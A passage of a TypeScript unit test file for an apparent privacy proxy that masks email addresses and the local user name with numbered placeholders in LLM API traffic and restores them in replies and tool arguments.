    expect(seen.map(entry => entry.body.messages[0].content)).toEqual(['mail ⟦EMAIL_1⟧', 'mail ⟦EMAIL_1⟧'])
    // The first conversation, compacted: its summary keeps ⟦EMAIL_1⟧ (EMAIL), EMAIL is gone, and the user pastes OTHER.
    await post('/v1/chat/completions', { model: 'm', messages: [
      { role: 'user', content: 'Summary of earlier turns: the customer is ⟦EMAIL_1⟧.' },
      { role: 'user', content: `Also cc ${OTHER}` },
    ] }, headers)
    expect(seen[2]!.body.messages.map((message: any) => message.content)).toEqual(['Summary of earlier turns: the customer is ⟪EMAIL_1⟫.', 'Also cc ⟦EMAIL_2⟧'])
  })

  it('keeps a Responses chain\'s numbering after another conversation gives a passed number a second value', async () => {
    const headers = fresh()
    const THIRD = 'third.fictional@example.test'
    reply = () => ({ json: { id: 'r1', output: [{ type: 'function_call', call_id: 'c', name: 'bash', arguments: JSON.stringify({ command: 'echo ⟦EMAIL_1⟧' }) }] } })
    await post('/v1/responses', { model: 'm', input: `mail ${EMAIL}` }, headers)
    reply = () => ({ json: { id: 'r2', output: [] } })
    await post('/v1/responses', { model: 'm', previous_response_id: 'r1', input: [{ type: 'function_call_output', call_id: 'c', output: `⟦EMAIL_1⟧ ok, also ${OTHER}` }] }, headers)
    const otherId = (seen[1]!.body.input[0].output as string).match(/⟦EMAIL_\d+⟧/g)!.at(-1)!
    // Another conversation of the client binds THIRD to EMAIL_1.
    reply = () => ({ json: { choices: [] } })
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `mail ${THIRD}` }] }, headers)
    expect(seen[2]!.body.messages[0].content).toBe('mail ⟦EMAIL_1⟧')
    // The chain goes on: the upstream still holds the numbers r2 sent, so its reply must restore by them.
    reply = () => ({ json: { id: 'r3', output: [{ type: 'message', content: [{ type: 'output_text', text: `first ⟦EMAIL_1⟧, other ${otherId}` }] }] } })
    const third = await (await post('/v1/responses', { model: 'm', previous_response_id: 'r2', input: `and ${THIRD}, resend ⟦EMAIL_1⟧` }, headers)).json() as any
    expect(third.output[0].content[0].text).toBe(`first ${EMAIL}, other ${OTHER}`)
    // ⟦EMAIL_1⟧ already names EMAIL upstream in this chain, so the new text passes it too.
    expect(seen[3]!.body.input).toMatch(/^and ⟦EMAIL_\d+⟧, resend ⟦EMAIL_1⟧$/)
    expect(seen[3]!.body.input).not.toContain(otherId)
  })

  it('finds a free holding character in one pass over the texts, even when they use nearly every private-use character', () => {
    let pua = ''
    for (let code = 0xe000; code < 0xf8ff; code += 1) pua += String.fromCharCode(code)
    const texts = [...Array.from({ length: 50_000 }, () => '中'.repeat(100)), pua]
    const started = performance.now()
    expect(unusedPrivateUse(texts)).toBe('\uf8ff')
    // Scanning every text once per private-use character took several seconds here.
    expect(performance.now() - started).toBeLessThan(500)
    expect(unusedPrivateUse([pua, '\uf8ff'])).toBeUndefined()
  })

  it('escapes as before when memory is off', async () => {
    await start({ toolRestore: { categories: DEFAULT_TOOL_RESTORE_CATEGORIES, tools: new Map() }, knownOriginalsTtlSeconds: 0 })
    try {
      const headers = fresh()
      reply = () => ({ json: { choices: [] } })
      await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: EMAIL }] }, headers)
      await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: EMAIL }, { role: 'assistant', content: 'mail ⟦EMAIL_1⟧' }] }, headers)
      expect(seen[1]!.body.messages.map((message: any) => message.content)).toEqual(['⟦EMAIL_2⟧', 'mail ⟪EMAIL_1⟫'])
    } finally {
      await start({ toolRestore: { categories: DEFAULT_TOOL_RESTORE_CATEGORIES, tools: new Map() } })
    }
  })

  it('passes the placeholder through a refusing screen, which still refuses an unknown one', async () => {
    await start({ toolRestore: { categories: DEFAULT_TOOL_RESTORE_CATEGORIES, tools: new Map() }, screen: 'refuse' })
    try {
      const headers = fresh()
      reply = () => ({ json: { choices: [] } })
      await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: EMAIL }] }, headers)
      const call = { id: 'call1', type: 'function', function: { name: 'bash', arguments: JSON.stringify({ command: 'mail ⟦EMAIL_1⟧' }) } }
      const ok = await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: EMAIL }, { role: 'assistant', content: null, tool_calls: [call] }] }, headers)
      expect(ok.status).toBe(200)
      expect(JSON.parse(seen[1]!.body.messages[1].tool_calls[0].function.arguments).command).toBe('mail ⟦EMAIL_1⟧')
      const unknown = await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: EMAIL }, { role: 'assistant', content: 'mail ⟦EMAIL_7⟧' }] }, headers)
      expect(unknown.status).toBe(422)
      // Only in assistant text, the issued placeholder is not anchored, so it is refused like an unknown one.
      const unanchored = await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: EMAIL }, { role: 'assistant', content: 'mail ⟦EMAIL_1⟧' }] }, headers)
      expect(unanchored.status).toBe(422)
    } finally {
      await start({ toolRestore: { categories: DEFAULT_TOOL_RESTORE_CATEGORIES, tools: new Map() } })
    }
  })
})

describe('the local user name', () => {
  // Synthetic accounts; the tests never read the real one.
  const withUser = (username: string): Promise<void> => {
    const { redaction, localUsernames } = loadConfig(undefined, {}, { username, homedir: `/Users/${username}` })
    return start({ redaction, localUsernames, toolRestore: { categories: DEFAULT_TOOL_RESTORE_CATEGORIES, tools: new Map() } })
  }
  afterAll(() => start())

  it('is masked bare and inside project-directory names, and restored into tool arguments', async () => {
    await withUser('fictionaluser')
    const context = {
      user_identity: 'fictionaluser',
      live_cwd: '/private/tmp/claude-501/-Users-fictionaluser-project/abc/scratchpad',
      trusted_directories: ['/Users/fictionaluser/project'],
    }
    reply = entry => {
      const term = placeholders(entry.raw).find(found => found.startsWith('⟦TERM_'))!
      return { json: { id: 'm', type: 'message', role: 'assistant', content: [{ type: 'text', text: `Hi ${term}` }, { type: 'tool_use', id: 't', name: 'Bash', input: { command: `ls /tmp/-Users-${term}-project` } }] } }
    }
    const body = await (await post('/v1/messages', { model: 'c', max_tokens: 1, safeguards: [{ classifier_context: context }], messages: [{ role: 'user', content: 'Where am I?' }] }, { 'x-api-key': 'k' })).json() as any
    expect(seen[0]!.raw).not.toMatch(/fictionaluser/i)
    expect(seen[0]!.body.safeguards[0].classifier_context).toEqual({
      user_identity: '⟦TERM_1⟧',
      live_cwd: '/private/tmp/claude-501/-Users-⟦TERM_1⟧-project/abc/scratchpad',
      trusted_directories: [expect.stringMatching(/^⟦(PATH|TERM)_1⟧/)],
    })
    expect(body.content[0].text).toBe('Hi fictionaluser')
    expect(body.content[1].input.command).toBe('ls /tmp/-Users-fictionaluser-project')
  })

  it('never refuses a request over a user name that also spells a key, a model id, or a tool name', async () => {
    reply = () => ({ json: { content: [] } })
    for (const username of ['max', 'claude', 'bash']) {
      await withUser(username)
      const res = await post('/v1/messages', {
        model: 'claude-haiku-5-5', max_tokens: 1, tools: [{ name: 'bash', input_schema: { type: 'object' } }],
        messages: [{ role: 'user', content: `ask ${username} about it` }],
      }, { 'x-api-key': 'k' })
      expect(res.status, username).toBe(200)
      expect(seen.at(-1)!.body.messages[0].content, username).toBe('ask ⟦TERM_1⟧ about it')
    }
  })

  it('still refuses over a listed term that spells the user name in another case', async () => {
    const path = join(mkdtempSync(join(tmpdir(), 'proxy-terms-')), 'terms.toml')
    writeFileSync(path, 'redaction.terms = ["Fictionaluser"]')
    const { redaction, localUsernames } = loadConfig(path, {}, { username: 'fictionaluser', homedir: '/Users/fictionaluser' })
    await start({ redaction, localUsernames, toolRestore: { categories: DEFAULT_TOOL_RESTORE_CATEGORIES, tools: new Map() } })
    reply = () => ({ json: { content: [] } })
    // The tool name keeps the term, which the proxy does not rewrite.
    const res = await post('/v1/messages', { model: 'c', max_tokens: 1, tools: [{ name: 'Fictionaluser', input_schema: { type: 'object' } }], messages: [{ role: 'user', content: 'ask Fictionaluser about it' }] }, { 'x-api-key': 'k' })
    expect(res.status).toBe(422)
  })

  it('masks the user name as a whole word in any ASCII case and sends a glued occurrence as written, never refusing', async () => {
    await withUser('fictionaluser')
    reply = () => ({ json: { content: [] } })
    const out: string[] = []
    for (const text of ['notes in fictionaluser_project/x.md', 'see fictionaluser2024 and Fictionaluser-notes', 'user=fictionaluser;', 'FICTIONALUSER wrote it']) {
      const res = await post('/v1/messages', { model: 'c', max_tokens: 1, messages: [{ role: 'user', content: text }] }, { 'x-api-key': 'k' })
      out.push(`${res.status} ${seen.at(-1)!.body.messages[0].content}`)
    }
    expect(out).toEqual([
      '200 notes in ⟦TERM_1⟧_project/x.md',
      '200 see fictionaluser2024 and ⟦TERM_1⟧-notes',
      '200 user=⟦TERM_1⟧;',
      '200 ⟦TERM_1⟧ wrote it',
    ])
  })

  it('leaves the word node alone when the proxy runs as the container user node', async () => {
    await withUser('node')
    reply = () => ({ json: { choices: [] } })
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: 'Install node, then run node index.js.' }] })
    expect(seen[0]!.body.messages[0].content).toBe('Install node, then run node index.js.')
  })
})
